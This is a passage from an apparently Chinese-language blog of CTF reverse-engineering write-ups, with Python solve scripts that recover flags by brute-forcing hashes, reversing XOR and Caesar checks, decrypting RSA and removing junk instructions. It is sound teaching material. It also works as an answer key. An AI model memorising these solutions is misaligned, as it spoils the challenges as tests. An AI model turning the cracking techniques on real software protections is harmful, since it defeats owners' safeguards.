class="keyword">if</span> sha1Encode(plain) == <span class="string">&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;</span>:</span><br><span class="line">passwd1 = <span class="built_in">str</span>(i)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> passwd1</span><br><span class="line"><span class="comment"># 123321</span></span><br></pre></td></tr></table></figure><p>第二次输入检查：</p><p><img src="../img/CrackRTF/5.png" alt="CrackRTF"></p><p>同理可以确定 sub_401019 为 md5 哈希函数：</p><p><img src="../img/CrackRTF/6.png" alt="CrackRTF"></p><p><img src="../img/CrackRTF/7.png" alt="CrackRTF"></p><p>这次密码就有点难爆了，不像密码 1 暗示你它是一个 6 位整数，这里需要考虑所有可打印字符。使用脚本可能会爆很久，所以我选择使用工具 hashcat 来爆破，得到密码 2 为 <code>~!3a@0</code></p><p>乖乖将这俩密码依次输入程序可以得到一个 dbapp.rtf，打开就是 flag</p><br><h3 id="BJDCTF2020-JustRE-x86-exe-图形界面"><a href="#BJDCTF2020-JustRE-x86-exe-图形界面" class="headerlink" title="[BJDCTF2020]JustRE | x86,exe,图形界面"></a>[BJDCTF2020]JustRE | x86,exe,图形界面</h3><p>又是个不用框架写图形界面的，WinMain 里调用 sub_4010C0 注册 RE2 类，对应的窗体函数是 sub_4011C0。</p><p>Resource Hacker 查看 “测试你的手速” 对话框的资源号为 129，在 sub_4011C0 中找到对应的处理函数是 DialogFunc：</p><p><img src="../img/BJDCTF2020JustRE/1.png" alt="BJDCTF2020JustRE"></p><p>查看 DialogFunc：</p><p><img src="../img/BJDCTF2020JustRE/2.png" alt="BJDCTF2020JustRE"></p><br><h3 id="2019红帽杯-easyRE-x86-elf-elf运行流程"><a href="#2019红帽杯-easyRE-x86-elf-elf运行流程" class="headerlink" title="[2019红帽杯]easyRE | x86,elf,elf运行流程"></a>[2019红帽杯]easyRE | x86,elf,elf运行流程</h3><p>shift + F12，查找 “You found me!!!” 的交叉引用，找到 sub_4009C6。第一部分：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/1.png" alt="2019红帽杯easyRE"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="number">0</span>] * <span class="number">36</span></span><br><span class="line">target[<span class="number">0</span>] = <span class="number">73</span></span><br><span class="line">target[<span class="number">1</span>] = <span class="number">111</span></span><br><span class="line">target[<span class="number">2</span>] = <span class="number">100</span></span><br><span class="line">target[<span class="number">3</span>] = <span class="number">108</span></span><br><span class="line">target[<span class="number">4</span>] = <span class="number">62</span></span><br><span class="line">target[<span class="number">5</span>] = <span class="number">81</span></span><br><span class="line">target[<span class="number">6</span>] = <span class="number">110</span></span><br><span class="line">target[<span class="number">7</span>] = <span class="number">98</span></span><br><span class="line">target[<span class="number">8</span>] = <span class="number">40</span></span><br><span class="line">target[<span class="number">9</span>] = <span class="number">111</span></span><br><span class="line">target[<span class="number">10</span>] = <span class="number">99</span></span><br><span class="line">target[<span class="number">11</span>] = <span class="number">121</span></span><br><span class="line">target[<span class="number">12</span>] = <span class="number">127</span></span><br><span class="line">target[<span class="number">13</span>] = <span class="number">121</span></span><br><span class="line">target[<span class="number">14</span>] = <span class="number">46</span></span><br><span class="line">target[<span class="number">15</span>] = <span class="number">105</span></span><br><span class="line">target[<span class="number">16</span>] = <span class="number">127</span></span><br><span class="line">target[<span class="number">17</span>] = <span class="number">100</span></span><br><span class="line">target[<span class="number">18</span>] = <span class="number">96</span></span><br><span class="line">target[<span class="number">19</span>] = <span class="number">51</span></span><br><span class="line">target[<span class="number">20</span>] = <span class="number">119</span></span><br><span class="line">target[<span class="number">21</span>] = <span class="number">125</span></span><br><span class="line">target[<span class="number">22</span>] = <span class="number">119</span></span><br><span class="line">target[<span class="number">23</span>] = <span class="number">101</span></span><br><span class="line">target[<span class="number">24</span>] = <span class="number">107</span></span><br><span class="line">target[<span class="number">25</span>] = <span class="number">57</span></span><br><span class="line">target[<span class="number">26</span>] = <span class="number">123</span></span><br><span class="line">target[<span class="number">27</span>] = <span class="number">105</span></span><br><span class="line">target[<span class="number">28</span>] = <span class="number">121</span></span><br><span class="line">target[<span class="number">29</span>] = <span class="number">61</span></span><br><span class="line">target[<span class="number">30</span>] = <span class="number">126</span></span><br><span class="line">target[<span class="number">31</span>] = <span class="number">121</span></span><br><span class="line">target[<span class="number">32</span>] = <span class="number">76</span></span><br><span class="line">target[<span class="number">33</span>] = <span class="number">64</span></span><br><span class="line">target[<span class="number">34</span>] = <span class="number">69</span></span><br><span class="line">target[<span class="number">35</span>] = <span class="number">67</span></span><br><span class="line"></span><br><span class="line">input1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> idx, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(target):</span><br><span class="line">input1 += <span class="built_in">chr</span>(idx ^ value)</span><br><span class="line"><span class="built_in">print</span> input1</span><br></pre></td></tr></table></figure><p>得到的输出是 Info:The first four chars are `flag`。第二部分：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/2.png" alt="2019红帽杯easyRE"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFdha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">target = base64.b64decode(target)</span><br><span class="line"><span class="built_in">print</span> target</span><br></pre></td></tr></table></figure><p>得到输出 <a href="https://bbs.pediy.com/thread-254172.htm">[原创]看雪CTF从入门到存活（六）主动防御 </a>，访问该网站可以在评论区找到其他选手发的 flag。不过出题人的本意不是这样的，在 elf 中可以找到计算 flag 的函数。该函数在 main 函数运行结束后的 __libc_csu_fini 函数中被调用。</p><p>众  所  周  知，elf 从 start 函数开始执行（由 Entry point 指定），然后执行顺序是 __libc_start_main -&gt; __libc_csu_init -&gt; _init_array 中的函数 -&gt; main -&gt; __libc_csu_fini -&gt; _fini_array 中的函数。</p><p>这道题的 start 函数：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/3.png" alt="2019红帽杯easyRE"></p><p>_init_array 地址可以在 __libc_csu_init 函数中找到：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/4.png" alt="2019红帽杯easyRE"></p><p>翻一翻 _init_array 和 _fini_array 中的函数，每个都点过去 F5 看一下：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/5.png" alt="2019红帽杯easyRE"></p><p>_fini_array 的第二个函数指针 sub_400D35 最为可疑：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFeasyRE/6.png" alt="2019红帽杯easyRE"></p><p>结合之前得到的信息 Info:The first four chars are `flag`，不难推测 v8 这个四字节变量的值要拿 byte_6CC0A0 的前四字节来与 “flag” 逐字节异或。解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">&quot;40 35 20 56 5D 18 22 45 17 2F 24 6E 62 3C 27 54 48 6C 24 6E 72 3C 32 45 5B&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">target = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> target]</span><br><span class="line"></span><br><span class="line">xor = <span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">key = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">key[i] = xor[i] ^ target[i]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target)):</span><br><span class="line">flag += <span class="built_in">chr</span>(key[i%<span class="number">4</span>] ^ target[i])</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="Youngter-drive-x86-exe-upx-花指令"><a href="#Youngter-drive-x86-exe-upx-花指令" class="headerlink" title="Youngter-drive | x86,exe,upx,花指令"></a>Youngter-drive | x86,exe,upx,花指令</h3><p>PS. 这题出的有问题，off_418004 字符数组长度应该为 30，少的最后那个字符是 ‘y’</p><p>先 <code>upx.exe -d</code> 对 exe 进行解压，ida 打开，发现这玩意儿还整了个 TLS 回调来检测调试器，我想说原 exe 我都运行不起来……看看 main_0 函数的逻辑吧：</p><p><img src="../img/Youngter-drive/1.png" alt="Youngter-drive"></p><p>StartAddress 函数：</p><p><img src="../img/Youngter-drive/2.png" alt="Youngter-drive"></p><p>sub_41119F 函数：</p><p><img src="../img/Youngter-drive/3.png" alt="Youngter-drive"></p><p>为啥上面两张图片的分辨率不一样呢？那是因为亲爱的学校又双叒叕停电了，台式机直接暴毙，只能换成笔记本，我 tm***</p><p>从这俩函数的行为可以判断出 StartAddress 与 sub_41119F 将会交替执行，且线程 1 会先拿到锁（信号量与锁机制）。再来研究一下 StartAddress 中调用的 sub_41112C，这个函数又调用了 sub_411940，而 sub_411940 因为添加了花指令导致 ida 无法反编译：</p><p><img src="../img/Youngter-drive/4.png" alt="Youngter-drive"></p><p>找找是哪里出问题了，Options -&gt; General 打开栈指针、显示字节码：</p><p><img src="../img/Youngter-drive/5.png" alt="Youngter-drive"></p><p>找到导致 ida 栈跟踪分析出错的花指令：</p><p><img src="../img/Youngter-drive/6.png" alt="Youngter-drive"></p><p>将 <code>add esp, 8</code> nop 掉就可以愉快 F5 了（当然也可以 Alt + K 调整栈指针达到栈平衡）：</p><p><img src="../img/Youngter-drive/7.png" alt="Youngter-drive"></p><p>反编译：</p><p><img src="../img/Youngter-drive/8.png" alt="Youngter-drive"></p><p>这个函数干的事情就是把输入的大写字母替换成 off_418000[0] 字符数组中的小写字母，把输入的小写字母替换成 off_418000[0] 字符数组中的大写字母，而且是隔一个字符处理一次（上面分析过了）</p><p>最后在 sub_411190 -&gt; sub_411880 函数中判断处理后的输入与 off_418004 是否逐字节相等，然而这里题目出错了，off_418004 字符数组长度应该为 30，少的那个字符是 ‘y’，上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;</span> + <span class="string">&#x27;y&#x27;</span></span><br><span class="line">table = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line">target = <span class="built_in">map</span>(<span class="built_in">ord</span>, target)</span><br><span class="line">table = <span class="built_in">map</span>(<span class="built_in">ord</span>, table)</span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&#x27;&#x27;</span>] * <span class="built_in">len</span>(target)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> i % <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span> target[i] &lt; <span class="number">97</span>:</span><br><span class="line">flag[i] = <span class="built_in">chr</span>(table.index(target[i]) + <span class="number">96</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag[i] = <span class="built_in">chr</span>(table.index(target[i]) + <span class="number">38</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag[i] = <span class="built_in">chr</span>(target[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(flag)</span><br></pre></td></tr></table></figure><br><h3 id="ACTF新生赛2020-easyre-x86-exe-upx"><a href="#ACTF新生赛2020-easyre-x86-exe-upx" class="headerlink" title="[ACTF新生赛2020]easyre | x86,exe,upx"></a>[ACTF新生赛2020]easyre | x86,exe,upx</h3><p><code>upx.exe -d</code> 对 exe 进行解压，ida 打开找到 main 函数，逻辑很简单：</p><p><img src="../img/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1.png" alt="ACTF新生赛2020easyre"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">&quot;7E 7D 7C 7B 7A 79 78 77 76 75 74 73 72 71 70 6F 6E 6D 6C 6B 6A 69 68 67 66 65 64 63 62 61 60 5F 5E 5D 5C 5B 5A 59 58 57 56 55 54 53 52 51 50 4F 4E 4D 4C 4B 4A 49 48 47 46 45 44 43 42 41 40 3F 3E 3D 3C 3B 3A 39 38 37 36 35 34 33 32 31 30 2F 2E 2D 2C 2B 2A 29 28 27 26 25 24 23 20 21 22 00&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">table = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0</span>] * <span class="number">12</span></span><br><span class="line">key[<span class="number">0</span>] = <span class="number">42</span></span><br><span class="line">key[<span class="number">1</span>] = <span class="number">70</span></span><br><span class="line">key[<span class="number">2</span>] = <span class="number">39</span></span><br><span class="line">key[<span class="number">3</span>] = <span class="number">34</span></span><br><span class="line">key[<span class="number">4</span>] = <span class="number">78</span></span><br><span class="line">key[<span class="number">5</span>] = <span class="number">44</span></span><br><span class="line">key[<span class="number">6</span>] = <span class="number">34</span></span><br><span class="line">key[<span class="number">7</span>] = <span class="number">40</span></span><br><span class="line">key[<span class="number">8</span>] = <span class="number">73</span></span><br><span class="line">key[<span class="number">9</span>] = <span class="number">63</span></span><br><span class="line">key[<span class="number">10</span>] = <span class="number">43</span></span><br><span class="line">key[<span class="number">11</span>] = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">&quot;ACTF&#123;&quot;</span>) + [<span class="string">&#x27;&#x27;</span>] * <span class="number">12</span> + [<span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">flag[<span class="number">5</span>+i] = <span class="built_in">chr</span>(table.index(key[i]) + <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(flag)</span><br></pre></td></tr></table></figure><br><h3 id="相册-JVM-apk-native层"><a href="#相册-JVM-apk-native层" class="headerlink" title="相册 | JVM,apk,native层"></a>相册 | JVM,apk,native层</h3><p>Android Killer 打开，得知入口类是 cn.baidujiayuan.ver5304.C1：</p><p><img src="../img/%E7%9B%B8%E5%86%8C/1.png" alt="相册"></p><p>jadx 打开看看该类的 onCreate 方法：</p><p><img src="../img/%E7%9B%B8%E5%86%8C/2.png" alt="相册"></p><p>A2、M2、C2 这几个类都比较可疑，题目让找 email 地址，就 C2 沾点边了：</p><p><img src="../img/%E7%9B%B8%E5%86%8C/3.png" alt="相册"></p><p>右键跳到 NativeMethod 的声明处：</p><p><img src="../img/%E7%9B%B8%E5%86%8C/4.png" alt="相册"></p><p>都是 native 层的方法，那就把 so 库拿出来（apk 后缀改成 zip，解压后 so 库在 lib 目录下），这里只有一个 arm 32 位的 libcore.so。ida 打开，找到方法 Java_com_net_cn_NativeMethod_m（JNI 开发编译时会在方法名前加上类的路径），该方法返回一个 base64 字符串：</p><p><img src="../img/%E7%9B%B8%E5%86%8C/5.png" alt="相册"></p><p>base64 解码一下就是 flag</p><br><h3 id="SUCTF2019-SignIn-x86-elf-RSA"><a href="#SUCTF2019-SignIn-x86-elf-RSA" class="headerlink" title="[SUCTF2019]SignIn | x86,elf,RSA"></a>[SUCTF2019]SignIn | x86,elf,RSA</h3><p>main 函数逻辑：</p><p><img src="../img/SUCTF2019SignIn/1.png" alt="SUCTF2019SignIn"></p><p>用到了一些 gmp 大数运算的函数：</p><ul><li>gmpz_init_set_str(buffer, str, radix) ：将进制为 radix 的 str 表示的数存到 buffer 中去</li><li>gmpz_powm(x, y, z)：return x**y % z</li></ul><p>经典 RSA 加密，把 mod 分解成 p 和 q，用 gmpy2 库解得明文 output（<strong>python3 运行</strong>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">c = <span class="built_in">int</span>(<span class="string">&quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;</span>, <span class="number">16</span>)</span><br><span class="line">plain = <span class="built_in">pow</span>(c, d, p * q)</span><br><span class="line">output = <span class="string">&quot;%x&quot;</span> % plain</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"><span class="comment"># 73756374667b50776e5f405f68756e647265645f79656172737d</span></span><br></pre></td></tr></table></figure><p>output 是经过 Encode 函数编码过的，该函数每次取来输入的一个字节，高 4 bit 和低 4 bit 分别到 byte_202010 字符数组中去映射为新的字符，将输入的 32 字节扩展为 64 字节的 output：</p><p><img src="../img/SUCTF2019SignIn/2.png" alt="SUCTF2019SignIn"></p><p>逆回去：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">output = <span class="string">&quot;73756374667b50776e5f405f68756e647265645f79656172737d&quot;</span></span><br><span class="line">flag = [<span class="string">&#x27;&#x27;</span>] * (<span class="built_in">len</span>(output) // <span class="number">2</span>)</span><br><span class="line">mapTable = <span class="string">&quot;30 31 32 33 34 35 36 37 38 39 61 62 63 64 65 66&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">mapTable = [<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">16</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> mapTable]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(output), <span class="number">2</span>):</span><br><span class="line">high4Bit = mapTable.index(output[i])</span><br><span class="line">low4Bit  = mapTable.index(output[i+<span class="number">1</span>])</span><br><span class="line">curByte  = high4Bit &lt;&lt; <span class="number">4</span> | low4Bit</span><br><span class="line">flag[i//<span class="number">2</span>] = <span class="built_in">chr</span>(curByte)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure><br><h3 id="ACTF新生赛2020-rome-x86-exe-恺撒密码"><a href="#ACTF新生赛2020-rome-x86-exe-恺撒密码" class="headerlink" title="[ACTF新生赛2020]rome | x86,exe,恺撒密码"></a>[ACTF新生赛2020]rome | x86,exe,恺撒密码</h3><p>恺撒密码，逻辑简单：</p><p><img src="../img/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1.png" alt="ACTF新生赛2020rome"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">target = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">target[<span class="number">0</span>] = <span class="number">81</span></span><br><span class="line">target[<span class="number">1</span>] = <span class="number">115</span></span><br><span class="line">target[<span class="number">2</span>] = <span class="number">119</span></span><br><span class="line">target[<span class="number">3</span>] = <span class="number">51</span></span><br><span class="line">target[<span class="number">4</span>] = <span class="number">115</span></span><br><span class="line">target[<span class="number">5</span>] = <span class="number">106</span></span><br><span class="line">target[<span class="number">6</span>] = <span class="number">95</span></span><br><span class="line">target[<span class="number">7</span>] = <span class="number">108</span></span><br><span class="line">target[<span class="number">8</span>] = <span class="number">122</span></span><br><span class="line">target[<span class="number">9</span>] = <span class="number">52</span></span><br><span class="line">target[<span class="number">10</span>] = <span class="number">95</span></span><br><span class="line">target[<span class="number">11</span>] = <span class="number">85</span></span><br><span class="line">target[<span class="number">12</span>] = <span class="number">106</span></span><br><span class="line">target[<span class="number">13</span>] = <span class="number">119</span></span><br><span class="line">target[<span class="number">14</span>] = <span class="number">64</span></span><br><span class="line">target[<span class="number">15</span>] = <span class="number">108</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">&quot;ACTF&#123;&quot;</span>) + [<span class="string">&#x27;&#x27;</span>] * <span class="number">16</span> + [<span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= target[i] &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">if</span> target[i] == (<span class="built_in">ord</span>(j) - <span class="number">51</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>):</span><br><span class="line">flag[i+<span class="number">5</span>] = j</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= target[i] &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string.lowercase:</span><br><span class="line"><span class="keyword">if</span> target[i] == (<span class="built_in">ord</span>(j) - <span class="number">79</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">flag[i+<span class="number">5</span>] = j</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag[i+<span class="number">5</span>] = <span class="built_in">chr</span>(target[i])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(flag)</span><br></pre></td></tr></table></figure><br><h3 id="GUET-CTF2019-re-x86-elf-upx"><a href="#GUET-CTF2019-re-x86-elf-upx" class="headerlink" title="[GUET-CTF2019]re | x86,elf,upx"></a>[GUET-CTF2019]re | x86,elf,upx</h3><p>PS. 题目有误，flag[6] = ‘1’</p><p>upx 解压以后，ida 打开，shift + F12 查找 “input your flag” 字符串的交叉引用，找到 main 函数（或者可以通过 start 函数直接找），逻辑很简单：</p><p><img src="../img/GUET-CTF2019re/1.png" alt="GUET-CTF2019re"></p><p>Check 函数对输入的每一字节进行检查，除回去就能得到 flag 了，这里题目少了一个条件导致 flag[6] 无法确定，经尝试后 flag[6] = ‘1’：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">flag[<span class="number">0</span>] = <span class="number">166163712</span> / <span class="number">1629056</span></span><br><span class="line">flag[<span class="number">1</span>] = <span class="number">731332800</span> / <span class="number">6771600</span></span><br><span class="line">flag[<span class="number">2</span>] = <span class="number">357245568</span> / <span class="number">3682944</span></span><br><span class="line">flag[<span class="number">3</span>] = <span class="number">1074393000</span> / <span class="number">10431000</span></span><br><span class="line">flag[<span class="number">4</span>] = <span class="number">489211344</span> / <span class="number">3977328</span></span><br><span class="line">flag[<span class="number">5</span>] = <span class="number">518971936</span> / <span class="number">5138336</span></span><br><span class="line">flag[<span class="number">6</span>] = <span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">flag[<span 